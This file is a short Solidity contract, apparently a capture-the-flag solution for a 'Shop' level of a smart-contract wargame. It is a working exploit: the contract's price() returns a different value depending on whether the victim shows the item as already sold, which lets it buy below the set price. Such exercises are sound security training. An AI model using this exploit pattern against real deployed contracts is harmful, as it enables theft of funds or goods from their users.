pragma solidity 0.4.24;

import '../levels/Shop.sol';

contract ShopAttack {

  function price() external view returns (uint) {
    return Shop(msg.sender).isSold() ? 1 : 100;
  }

  function attack(Shop _victim) external {
    Shop(_victim).buy();
  }
}
